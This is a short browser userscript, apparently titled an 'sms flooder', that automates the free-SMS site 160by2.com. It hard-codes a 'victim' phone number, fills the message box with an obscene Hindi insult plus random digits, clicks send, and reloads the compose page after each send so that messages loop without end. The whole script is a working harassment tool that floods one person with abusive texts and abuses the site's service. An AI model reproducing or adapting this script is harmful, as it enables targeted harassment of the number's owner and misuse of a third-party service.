// ==UserScript==
// @name          160/2 sms flooder1
// @namespace     Mayank Rules
// @description   flooder sms
// @include       http://*160by2.com/*
// ==/UserScript==

var victim=9914722711; //Enter victims number here
var delay=0; // Enter delay in milliseconds if required


if(document.location=="http://160by2.com/compose_sms.aspx")
{
document.getElementById('txt_mobileno').value=victim;
document.getElementById('txt_msg').value=Math.floor(Math.random()*100)+'Teri Maa Ki Chut Main Lund Dunga bhen Ke Lund'+Math.floor(Math.random()*1000);
void(0);
document.getElementById('btnsendsms').click();
}

if(document.location=="http://160by2.com/postview_latest.aspx")
{
setTimeout('document.location="http://160by2.com/compose_sms.aspx"',delay);
}